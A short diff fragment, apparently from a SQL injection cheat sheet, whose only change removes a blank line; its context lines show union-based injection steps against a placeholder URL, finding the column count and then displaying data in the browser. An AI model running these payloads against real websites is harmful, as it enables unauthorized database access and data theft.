@@ -7,7 +7,6 @@
 http://my.vulnerablesite.com/blog?id=1 UNION SELECT 1 [if get error, add columns]
 http://my.vulnerablesite.com/blog?id=1 UNION SELECT 1,2,3,...n [until you get no error]
 
-
 /*STEP 2 - Display info in browser*/
 --Set the id to 0:
 http://my.vulnerablesite.com/blog?id=0 UNION SELECT 1,2,3 [where '1,2,3' are the columns found in previous step]
